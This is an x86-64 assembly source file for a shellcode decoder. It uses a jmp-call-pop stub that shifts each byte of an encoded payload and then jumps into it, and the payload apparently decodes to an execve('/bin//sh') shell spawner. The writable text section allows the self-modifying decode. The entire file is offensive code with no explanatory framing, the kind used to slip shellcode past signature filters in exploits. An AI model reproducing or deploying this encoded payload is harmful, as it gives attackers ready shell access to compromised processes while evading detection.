
section .text progbits alloc exec write align=16  ; CHANGED HERE
	global _start

_start:

        jmp short call_shellcode ; using the jump, call and pop method to get into our shellcode

decoder:
        pop rsi                  ; get the address of EncodedShellcode into rsi
	xor rdx,rdx
	xor rcx,rcx
	mov cl,length
	lea rdx,[rsi]
decode:

        mov bl, byte [rdx]       ; moving current byte from shellcode string

decrease:
        dec bl             ; checking if we are done decoding and should
        dec bl                         ; jump directly to our shell code 
decrement:
	dec bl
        jz decrement
        mov byte [rdx] , bl
        inc rdx
	loop decode
        jmp short Shellcode


call_shellcode:
        call decoder
	Shellcode: db 0x4b,0x34,0xc3,0x53,0x4b,0xbe,0x32,0x65,0x6c,0x71,0x32,0x32,0x76,0x6b,0x56,0x4b,0x8c,0xea,0x53,0x4b,0x8c,0xe5,0x5a,0x4b,0x8c,0xe9,0x4b,0x86,0xc3,0x3e,0x12,0x08
        length equ $-Shellcode
